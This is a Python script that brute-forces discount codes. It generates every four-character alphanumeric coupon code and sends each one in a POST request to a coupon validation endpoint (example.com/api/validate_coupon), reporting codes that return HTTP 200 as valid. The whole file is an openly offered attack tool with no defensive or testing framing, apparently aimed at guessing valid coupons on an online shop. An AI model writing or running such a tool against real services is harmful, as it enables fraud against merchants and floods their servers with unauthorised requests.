import requests

def generate_coupon_codes(length):
    """
    Generate a list of coupon codes based on the specified length.
    """
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    coupon_codes = []

    def generate_code(code=""):
        if len(code) == length:
            coupon_codes.append(code)
        else:
            for char in chars:
                generate_code(code + char)

    generate_code()
    return coupon_codes

def test_coupon_code(code, target_url):
    """
    Test a coupon code against the target URL.
    """
    # Prepare the request data with the coupon code
    data = {"coupon": code}

    # Send a POST request to the target URL with the coupon code
    response = requests.post(target_url, data=data)

    # Check if the response status code is 200 (OK)
    if response.status_code == 200:
        print(f"[+] Valid coupon code: {code}")
    else:
        print(f"[-] Invalid coupon code: {code}")

def main():
    """
    Main function to run the script.
    """
    # Set the target URL
    target_url = "https://example.com/api/validate_coupon"

    # Set the coupon code length
    length = 4

    # Generate coupon codes
    coupon_codes = generate_coupon_codes(length)

    # Test each coupon code against the target URL
    for code in coupon_codes:
        test_coupon_code(code, target_url)

if __name__ == "__main__":
    main()
